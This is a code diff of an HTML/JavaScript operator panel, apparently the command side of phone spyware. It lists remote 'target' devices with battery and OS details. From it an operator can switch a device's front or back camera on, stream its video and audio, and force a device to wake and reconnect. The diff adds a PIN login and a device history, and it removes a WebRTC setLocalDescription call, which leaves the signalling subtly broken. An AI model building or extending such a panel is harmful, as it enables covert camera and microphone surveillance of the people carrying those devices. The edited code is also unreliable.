@@ -1,107 +1,172 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>LEO ADMIN - COMMANDER PRO</title>
+    <title>LEO ADMIN - COMMAND HUB PRO</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; --neon: #00ff9d; }
-        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; --neon: #00ff9d; --offline: #ff4444; }
+        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; }
         
-        /* Sidebar */
-        .sidebar { width: 300px; background: var(--panel); padding: 20px; border-right: 1px solid #1e3a8a; }
-        .user-item { background: #112240; padding: 15px; margin: 12px 0; border-radius: 12px; cursor: pointer; border: 1px solid transparent; transition: 0.3s; position: relative; }
-        .user-item.active { border-color: var(--blue); box-shadow: 0 0 15px rgba(0,212,255,0.3); }
-        .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; position: absolute; right: 15px; top: 15px; }
+        /* Sidebar with History */
+        .sidebar { width: 300px; background: var(--panel); padding: 20px; border-right: 1px solid #1e3a8a; overflow-y: auto; }
+        .user-item { background: #112240; padding: 15px; margin: 10px 0; border-radius: 12px; cursor: pointer; border: 2px solid transparent; transition: 0.3s; position: relative; }
+        .user-item.active { border-color: var(--blue); box-shadow: 0 0 15px rgba(0,212,255,0.2); }
+        .user-item.online { border-left: 5px solid var(--neon); }
+        .user-item.offline { border-left: 5px solid var(--offline); opacity: 0.7; }
+        
+        .status-tag { font-size: 0.6rem; font-weight: bold; position: absolute; top: 5px; right: 10px; }
 
-        /* Main View */
-        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px; background: radial-gradient(circle, #0a192f, #050a14); }
-        .video-wrapper { width: 100%; max-width: 850px; aspect-ratio: 16/9; background: #000; border: 2px solid var(--blue); border-radius: 20px; overflow: hidden; position: relative; }
+        /* Main Section */
+        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .video-box { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border: 2px solid var(--blue); border-radius: 15px; overflow: hidden; position: relative; }
         video { width: 100%; height: 100%; object-fit: contain; }
         
-        /* Buttons Grid */
-        .controls { margin-top: 25px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; width: 100%; max-width: 500px; }
-        .btn { background: #112240; border: 1px solid var(--blue); color: var(--blue); padding: 14px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.85rem; letter-spacing: 1px; }
+        /* Advanced Controls */
+        .controls { margin-top: 20px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; width: 100%; max-width: 500px; }
+        .btn { background: #112240; border: 1px solid var(--blue); color: var(--blue); padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.2s; }
         .btn:hover { background: var(--blue); color: var(--dark); }
-        .btn-wake { background: var(--neon); color: #000; border: none; grid-column: span 2; box-shadow: 0 0 15px rgba(0,255,157,0.4); }
+        .btn-wake { background: var(--neon); color: #000; border: none; grid-column: span 2; margin-bottom: 5px; font-size: 1rem; }
         
-        #audio-btn { position: absolute; bottom: 20px; right: 20px; background: #ff4444; color: white; padding: 10px 20px; border-radius: 50px; cursor: pointer; }
+        #login { position: fixed; inset: 0; background: var(--dark); display: flex; align-items: center; justify-content: center; z-index: 100; }
+        .info-tag { font-size: 0.7rem; color: #8892b0; margin-top: 5px; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
+    <div id="login">
+        <div style="text-align: center;">
+            <h2 style="color: var(--blue);">SYSTEM AUTHORIZATION</h2>
+            <input type="password" id="pin" placeholder="ENTER HUB PIN" style="padding:12px; border-radius:8px; background:#111; color:white; border:1px solid var(--blue); width: 200px;">
+            <br>
+            <button onclick="auth()" class="btn" style="margin-top:15px; width:100%;">ACCESS HUB</button>
+        </div>
+    </div>
 
     <div class="sidebar">
-        <h2 style="color: var(--blue); font-size: 1.2rem;">⚡ COMMAND CENTER</h2>
-        <div id="user-list"></div>
+        <h3 style="color: var(--blue); margin-bottom: 20px;">DEVICE HISTORY</h3>
+        <div id="user-list">
+            <p style="color: #444;">No devices found...</p>
+        </div>
     </div>
+
     <div class="main">
-        <div style="width:100%; display:flex; justify-content:space-between; margin-bottom:10px; font-size:0.8rem; color:#8892b0;">
-            <div>STATUS: <span id="sys-st" style="color:var(--neon);">HUB LINK ACTIVE</span></div>
-            <div>TARGET ID: <span id="cur-id" style="color:var(--blue);">---</span></div>
+        <div id="status-line" style="margin-bottom:15px; font-size:0.8rem; width:100%; display:flex; justify-content:space-between; border-bottom: 1px solid #1e3a8a; padding-bottom: 10px;">
+            <div>HUB: <span style="color:var(--neon);">ENCRYPTED LINK ONLINE</span></div>
+            <div>TARGET: <span id="cur-id" style="color:var(--blue);">NONE</span></div>
         </div>
 
-        <div class="video-wrapper">
+        <div class="video-box">
             <video id="remoteVideo" autoplay playsinline></video>
-            <div id="audio-btn" onclick="unmute()">🔊 UNMUTE AUDIO</div>
+            <div id="audio-btn" style="position:absolute; bottom:15px; right:15px; background:rgba(255,0,0,0.8); padding:8px 15px; border-radius:20px; cursor:pointer; font-size: 0.7rem; font-weight: bold;" onclick="unmute()">🔊 UNMUTE AUDIO</div>
         </div>
 
         <div class="controls">
-            <!-- TERA NAYA WAKE UP BUTTON -->
-            <button class="btn btn-wake" onclick="sendCommand('wake-up')">⚡ FORCE ACTIVATE DEVICE</button>
+            <!-- YE RAHA TERA FORCE WAKE UP BUTTON -->
+            <button class="btn btn-wake" onclick="sendCommand('wake-up')">⚡ FORCE WAKE UP / RECONNECT</button>
             
             <button class="btn" onclick="sendCommand('front')">FRONT CAMERA</button>
             <button class="btn" onclick="sendCommand('back')">BACK CAMERA</button>
-            <button class="btn" onclick="sendCommand('start')">REFRESH STREAM</button>
-            <button class="btn" style="color:#ff4444; border-color:#ff4444;" onclick="location.reload()">FULL HUB RESET</button>
+            <button class="btn" onclick="refreshHub()">REFRESH STREAM</button>
+            <button class="btn" style="color:var(--offline); border-color:var(--offline);" onclick="location.reload()">FULL HUB RESET</button>
         </div>
     </div>
-
     <script>
         const socket = io();
-        let currentId = null, pc;
+        let currentTarget = null, pc;
+        let deviceHistory = {}; // Persistent Storage for the session
         const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
-        socket.emit('admin-join', "0000");
-
-        socket.on('update-targets', (list) => {
-            const container = document.getElementById('user-list');
-            container.innerHTML = "";
-            list.forEach(t => {
-                const div = document.createElement('div');
-                div.className = `user-item ${currentId === t.id ? 'active' : ''}`;
-                div.innerHTML = `<strong>Device_${t.id.substring(0,4)}</strong><br>
-                                 <small style="color:#8892b0;">Bat: ${t.battery} | ${t.device}</small>
-                                 <span class="status-dot" style="background:${t.status==='online'?'#00ff00':'#ff4444'}"></span>`;
-                div.onclick = () => select(t.id);
-                container.appendChild(div);
-            });
+        function auth() { socket.emit('admin-join', document.getElementById('pin').value); }
+        
+        socket.on('admin-status', (r) => { 
+            if(r.success) document.getElementById('login').classList.add('hidden'); 
+            else alert("ACCESS DENIED"); 
         });
-        async function select(id) {
-            currentId = id; document.getElementById('cur-id').innerText = id.substring(0,6);
-            if(pc) pc.close();
-            pc = new RTCPeerConnection(config);
-            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: currentId, signal: { candidate: e.candidate } }); };
-            pc.ontrack = (e) => { document.getElementById('remoteVideo').srcObject = e.streams[0]; };
-            socket.emit('command', { targetId: currentId, cmd: 'start' });
+
+        // Smart Target Update with History Logic
+        socket.on('update-targets', (activeList) => {
+            // 1. Mark all current history as Offline first
+            for (let id in deviceHistory) { deviceHistory[id].status = 'offline'; }
+
+            // 2. Update status to Online for active ones and add new devices
+            activeList.forEach(target => {
+                deviceHistory[target.id] = {
+                    id: target.id,
+                    battery: target.battery,
+                    device: target.device,
+                    status: 'online'
+                };
+            });
+
+            renderDeviceList();
+        });
+
+        function renderDeviceList() {
+            const listDiv = document.getElementById('user-list');
+            listDiv.innerHTML = "";
+            
+            // Sort by status so Online ones come on top
+            const sortedIds = Object.keys(deviceHistory).sort((a, b) => {
+                return (deviceHistory[b].status === 'online') - (deviceHistory[a].status === 'online');
+            });
+
+            sortedIds.forEach(id => {
+                const device = deviceHistory[id];
+                const d = document.createElement('div');
+                d.className = `user-item ${currentTarget === id ? 'active' : ''} ${device.status}`;
+                d.innerHTML = `
+                <span class="status-tag" style="color: ${device.status === 'online' ? 'var(--neon)' : 'var(--offline)'}">
+                        ${device.status.toUpperCase()}
+                    </span>
+                    <strong>Device_${id.substring(0,4)}</strong>
+                    <div class="info-tag">OS: ${device.device} | Bat: ${device.battery}</div>
+                `;
+                d.onclick = () => {
+                    currentTarget = id;
+                    document.getElementById('cur-id').innerText = id.substring(0,8);
+                    renderDeviceList(); // Refresh active class
+                    if(device.status === 'online') select(id);
+                };
+                listDiv.appendChild(d);
+            });
         }
 
-        function unmute() { const v = document.getElementById('remoteVideo'); v.muted = false; v.play(); document.getElementById('audio-btn').style.display='none'; }
-        
-        function sendCommand(c) { 
-            if(!currentId) return alert("SELECT DEVICE FIRST!");
-            socket.emit('command', { targetId: currentId, cmd: c }); 
+        function unmute() { 
+            const v = document.getElementById('remoteVideo'); 
+            v.muted = false; 
+            v.play(); 
+            document.getElementById('audio-btn').classList.add('hidden'); 
+        }
+
+        function refreshHub() { if(currentTarget) select(currentTarget); }
+
+        async function select(id) {
+            if(pc) pc.close();
+            pc = new RTCPeerConnection(config);
+            pc.onicecandidate = (e) => { 
+                if(e.candidate) socket.emit('signal', { to: id, signal: { candidate: e.candidate } }); 
+            };
+            pc.ontrack = (e) => { 
+                document.getElementById('remoteVideo').srcObject = e.streams[0]; 
+            };
+            socket.emit('command', { targetId: id, cmd: 'start' });
         }
 
         socket.on('signal', async (d) => {
-            if(d.from !== currentId) return;
+            if(d.from !== currentTarget) return;
             if(d.signal.sdp) {
                 await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
                 if(d.signal.sdp.type === 'offer') {
                     const ans = await pc.createAnswer();
-                    await pc.setLocalDescription(ans);
                     socket.emit('signal', { to: d.from, signal: { sdp: ans } });
                 }
             } else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
         });
+
+        function sendCommand(c) { 
+            if(!currentTarget) return alert("SELECT A DEVICE FROM HISTORY FIRST!");
+            socket.emit('command', { targetId: currentTarget, cmd: c }); 
+        }
     </script>
 </body>
 </html>
